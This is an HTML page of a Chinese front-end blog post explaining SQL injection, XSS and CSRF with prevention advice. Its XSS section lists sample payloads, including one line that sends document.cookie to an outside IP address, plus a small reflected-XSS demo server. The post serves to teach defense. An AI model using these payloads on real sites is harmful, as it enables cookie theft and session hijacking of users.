@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ronaldoxzb" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      常见的web攻击及防范 
+      
+      
+      |
+    
+     RONALDOXZB
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="RONALDOXZB" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">RONALDOXZB</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">常见的web攻击及防范</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-03-08 15:41:32
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/FrontEnd-Tec/" title="FrontEnd-Tec">
+                    <b>#</b> FrontEnd-Tec
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/javascript/" title="javascript">
+                    <b>#</b> javascript
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/web/" title="web">
+                    <b>#</b> web
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/xss/" title="xss">
+                    <b>#</b> xss
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/csrf/" title="csrf">
+                    <b>#</b> csrf
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote>
+<p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>
+</blockquote>
+<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<h3 id="被攻击的原因"><a href="#被攻击的原因" class="headerlink" title="被攻击的原因:"></a>被攻击的原因:</h3><blockquote>
+<p>sql 语句伪造参数，然后在对参数进行拼接的后形成破坏性的 sql 语句，最后导致数据库受到攻击</p>
+</blockquote>
+<h3 id="防护："><a href="#防护：" class="headerlink" title="防护："></a>防护：</h3><ul>
+<li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。</li>
+<li>永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。</li>
+<li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li>
+<li>不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。</li>
+<li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li>
+<li>sql 注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用 sql 注入检测工具 jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN 等。采用 MDCSOFT-IPS 可以有效的防御 SQL 注入，XSS 攻击等。</li>
+<li>7.使用预编译语句(PreparedStatement)，这样的话即使我们使用 sql 语句伪造成参数，到了服务端的时候，这个伪造 sql 语句的参数也只是简单的字符，并不能起到攻击的作用。</li>
+</ul>
+<h2 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>跨站脚本攻击（XSS，Cross-site scripting）是最常见和基本的攻击 WEB 网站的方法。攻击者在网页上发布包含攻击性代码的数据。当浏览者看到此网页时，特定的脚本就会以浏览者用户的身份和权限来执行。通过 XSS 可以比较容易地修改用户数据、窃取用户信息，以及造成其它类型的攻击，例如 CSRF 攻击</p>
+<h3 id="被攻击的原因-1"><a href="#被攻击的原因-1" class="headerlink" title="被攻击的原因"></a>被攻击的原因</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- &lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;alert(‘xss’)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;a href=&#x27;&#x27; onclick=alert(&#x27;xss&#x27;)&gt;type&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">- &lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;window.location=‘http://192.168.1.1&#x27;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;iframe SRC=&quot;http://1.1.1.1/a.jpg&quot; height = &quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用户输入的数据变成了代码，比如说上面的 script,应该只是字符串却有了代码的作用。</p>
+</blockquote>
+<h3 id="三种方式"><a href="#三种方式" class="headerlink" title="三种方式"></a>三种方式</h3><p><code>反射型 XSS </code></p>
+<p>只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。</p>
+<p>访问 localhost:3000 页面上的恶意链接,恶意链接的地址指向了 localhost:8001,我们启动一个 8001 的服务,这样就产生了反射型 XSS 攻击。攻击者可以注入任意的恶意脚本进行攻击，可能注入恶作剧脚本，或者注入能获取用户隐私数据(如 cookie)的脚本，这取决于攻击者的目的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const http = require(&#x27;http&#x27;);</span><br><span class="line">function handleReequest(req, res) &#123;</span><br><span class="line">    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=UTF-8&#x27;&#125;);</span><br><span class="line">    res.write(&#x27;&lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;&#x27;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const server = new http.Server();</span><br><span class="line">server.listen(8001, &#x27;127.0.0.1&#x27;);</span><br><span class="line">server.on(&#x27;request&#x27;, handleReequest);</span><br></pre></td></tr></table></figure>
+
+<p><code>存储型</code></p>
+<p>存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。</p>
+<p>比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。</p>
+<p><code>基于DOM</code></p>
+<p>基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;XSS: &lt;/h2&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;input&quot;&gt;</span><br><span class="line">&lt;button id=&quot;btn&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;div id=&quot;div&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const input = document.getElementById(&#x27;input&#x27;);</span><br><span class="line">    const btn = document.getElementById(&#x27;btn&#x27;);</span><br><span class="line">    const div = document.getElementById(&#x27;div&#x27;);</span><br><span class="line"></span><br><span class="line">    let val;</span><br><span class="line"></span><br><span class="line">    input.addEventListener(&#x27;change&#x27;, (e) =&gt; &#123;</span><br><span class="line">        val = e.target.value;</span><br><span class="line">    &#125;, false);</span><br><span class="line"></span><br><span class="line">    btn.addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span><br><span class="line">        div.innerHTML = `&lt;a href=$&#123;val&#125;&gt;testLink&lt;/a&gt;`</span><br><span class="line">    &#125;, false);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>点击 Submit 按钮后，会在当前页面插入一个链接，其地址为用户的输入内容。如果用户在输入时构造了如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27; onclick=alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p>用户提交之后，页面代码就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href onlick=&quot;alert(/xss/)&quot;&gt;testLink&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/7871813/42721109-cb7ce572-8766-11e8-96d9-9ada8a787827.gif"></p>
+<h3 id="防护：-1"><a href="#防护：-1" class="headerlink" title="防护："></a>防护：</h3><ul>
+<li>确保输出到 HTML 页面的数据以 HTML 的方式被转义</li>
+<li>前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击：</li>
+<li>设置 HttpOnly 严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// vuejs 中的 decodingMap</span><br><span class="line">// 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉</span><br><span class="line">const decodingMap = &#123;</span><br><span class="line">  &#x27;&amp;lt;&#x27;: &#x27;&lt;&#x27;,</span><br><span class="line">  &#x27;&amp;gt;&#x27;: &#x27;&gt;&#x27;,</span><br><span class="line">  &#x27;&amp;quot;&#x27;: &#x27;&quot;&#x27;,</span><br><span class="line">  &#x27;&amp;amp;&#x27;: &#x27;&amp;&#x27;,</span><br><span class="line">  &#x27;&amp;#10;&#x27;: &#x27;\n&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="跨站请求伪造攻击（CSRF"><a href="#跨站请求伪造攻击（CSRF" class="headerlink" title="跨站请求伪造攻击（CSRF)"></a>跨站请求伪造攻击（CSRF)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>跨站请求伪造（CSRF，Cross-site request forgery）是另一种常见的攻击。攻击者通过各种方法伪造一个请求，模仿用户提交表单的行为，从而达到修改用户的数据，或者执行特定任务的目的。为了假冒用户的身份，CSRF 攻击常常和 XSS 攻击配合起来做，但也可以通过其它手段，例如诱使用户点击一个包含攻击的链接</p>
+<h3 id="被攻击的原因："><a href="#被攻击的原因：" class="headerlink" title="被攻击的原因："></a>被攻击的原因：</h3><ul>
+<li><p>用户本地存储 cookie，攻击者利用用户的 cookie 进行认证，然后伪造用户发出请求</p>
+</li>
+<li><p>之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的 cookie，那么如果我们不用 cookie 来验证不就可以预防了。所以我们可以采用 token（不存储于浏览器）认证，为每一个提交的表单生成一个随机 token， 存储在 session 中，每次验证表单 token，检查 token 是否正确。。</p>
+</li>
+<li><p>通过 referer 识别，HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行 A 网站才能进行转账了。</p>
+</li>
+</ul>
+<h3 id="防护：-2"><a href="#防护：-2" class="headerlink" title="防护："></a>防护：</h3><ul>
+<li>采用 POST 请求,增加攻击的难度.用户点击一个链接就可以发起 GET 类型的请求。而 POST 请求相对比较难，攻击者往往需要借助 javascript 才能实现</li>
+<li>对请求进行认证，确保该请求确实是用户本人填写表单并提交的，而不是第三者伪造的.具体可以在会话中增加 token,确保看到信息和提交信息的是同一个人</li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/02/10/npm-publish/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-03-08 15:41:32
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/FrontEnd-Tec/" title="FrontEnd-Tec">
+                        <b>#</b> FrontEnd-Tec
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/javascript/" title="javascript">
+                        <b>#</b> javascript
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/web/" title="web">
+                        <b>#</b> web
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/xss/" title="xss">
+                        <b>#</b> xss
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/csrf/" title="csrf">
+                        <b>#</b> csrf
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/03/11/js-runtime/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">被攻击的原因:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%EF%BC%9A"><span class="toc-text">防护：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XSS"><span class="toc-text">跨站脚本攻击(XSS)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E5%9B%A0-1"><span class="toc-text">被攻击的原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-text">三种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%EF%BC%9A-1"><span class="toc-text">防护：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%EF%BC%88CSRF"><span class="toc-text">跨站请求伪造攻击（CSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-text">被攻击的原因：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%EF%BC%9A-2"><span class="toc-text">防护：</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+  <div id="vcomments"></div>
+
+  <script>
+    new Valine({
+      el: '#vcomments',
+      appId: '7X0kL3ecg1bjvYt2yrJl3Cvc-gzGzoHsz',
+      appKey: 'FcRvdMWiqS8NATn4Ao8Chf56',
+      placeholder: 'Welcome My Friends!',
+      avatar: 'retro',
+      lang: 'zh-CN'
+    })
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ronaldoxzb">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="mailto:queenxzb@163.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ronaldoxzb">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="/images/weChat.png">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://ronaldoxzb.com">Copyright © ronaldoxzb 2021 | Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">浙ICP备2021018538号</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索一下...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%B8%B8%E8%A7%81%E7%9A%84web%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E8%8C%83 + '&url=' + http%3A%2F%2Fronaldoxzb.cn%2F2022%2F03%2F08%2Fweb-attack%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://ronaldoxzb.cn/2022/03/08/web-attack/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
